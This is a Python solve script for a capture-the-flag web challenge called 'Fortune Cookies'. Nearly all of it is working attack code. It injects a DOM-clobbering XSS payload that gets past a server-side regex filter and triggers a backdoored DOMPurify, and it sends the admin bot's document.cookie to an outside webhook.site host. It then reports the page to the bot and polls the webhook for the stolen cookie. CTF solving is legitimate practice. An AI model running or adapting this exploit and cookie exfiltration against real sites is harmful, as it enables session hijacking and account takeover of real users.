#!/usr/bin/env python3
"""
Challenge: Fortune Cookies
Category:  web
Platform:  caliphallabsRooted2026

XSS via DOM clobbering through backdoored DOMPurify.
Server-side regex filter bypassed with <tag/attr> syntax.
"""
import requests
import sys
import time

# === CONFIGURATION ===
LOCAL_URL = "http://localhost:5000"
REMOTE_URL = "http://fortunecookies.challs.caliphallabs.com"
WEBHOOK_UUID = "0ca280fd-fd37-4611-9dff-c2f0f6c4c55a"
WEBHOOK_URL = f"https://webhook.site/{WEBHOOK_UUID}"

BASE = REMOTE_URL if "--remote" in sys.argv else LOCAL_URL
session = requests.Session()

def exploit():
    # JS payload: exfiltrate cookies to webhook
    js_code = f"fetch('{WEBHOOK_URL}?c='+document.cookie)"

    # DOM Clobbering payload for backdoored DOMPurify
    # The backdoor in purify.min.js:
    #   document.forms['_config'] -> reads f1,i1,f2,i2
    #   new Function(forms[f2.value][i2.value].value)()
    #
    # Bypass server-side regex: use <tag/attr> instead of <tag attr>
    # Bypass </tag>: use </tag/>
    payload = (
        '<form/name="_config">'
        '<input/name="f1"/value="formA">'
        '<input/name="i1"/value="x">'
        '<input/name="f2"/value="formB">'
        '<input/name="i2"/value="code">'
        '</form/>'
        '<form/name="formA">'
        '<input/name="x"/value="dummy">'
        '</form/>'
        '<form/name="formB">'
        '<input/name="code"/value="' + js_code + '">'
        '</form/>'
    )

    print(f"[*] Target: {BASE}")
    print(f"[*] Webhook: {WEBHOOK_URL}")
    print(f"[*] Payload length: {len(payload)}")

    #  Submit fortune with XSS payload
    print("[*] Submitting fortune...")
    r = session.post(f"{BASE}/submit", data={
        "fortune": payload,
        "author": "test"
    })
    print(f"[*] Submit status: {r.status_code}")

    # Extract fortune_id from response
    import re
    match = re.search(r'/view/([a-f0-9\-]+)', r.text)
    if not match:
        print("[-] Could not find fortune_id in response")
        print(r.text[:500])
        return
    fortune_id = match.group(1)
    print(f"[+] Fortune ID: {fortune_id}")

    #  Verify the fortune is stored correctly
    print("[*] Previewing fortune...")
    r = session.get(f"{BASE}/view/{fortune_id}")
    print(f"[*] View status: {r.status_code}")
    if "form" in r.text.lower() and "_config" in r.text:
        print("[+] Forms present in page - payload looks good!")
    else:
        print("[-] Forms not found in page - check payload")
        print(r.text)
        return

    #  Report to bot (trigger admin visit)
    print("[*] Reporting to bot...")
    r = session.get(f"{BASE}/report/{fortune_id}")
    print(f"[*] Report status: {r.status_code}")

    print(f"\n[*] Waiting for bot to visit...")
    print(f"[*] Check webhook: https://webhook.site/#!/{WEBHOOK_UUID}")

    #  Poll webhook for results
    for i in range(30):
        time.sleep(2)
        r = requests.get(
            f"https://webhook.site/token/{WEBHOOK_UUID}/requests",
            headers={"Accept": "application/json"}
        )
        if r.status_code == 200:
            data = r.json()
            if data.get("data"):
                for req in data["data"]:
                    query = req.get("query", {})
                    print(f"\n[+] Got callback!")
                    print(f"[+] Cookie: {query}")
                    url = req.get("url", "")
                    print(f"[+] URL: {url}")
                return
        sys.stdout.write(".")
        sys.stdout.flush()

    print("\n[-] Timeout waiting for callback")

if __name__ == "__main__":
    exploit()
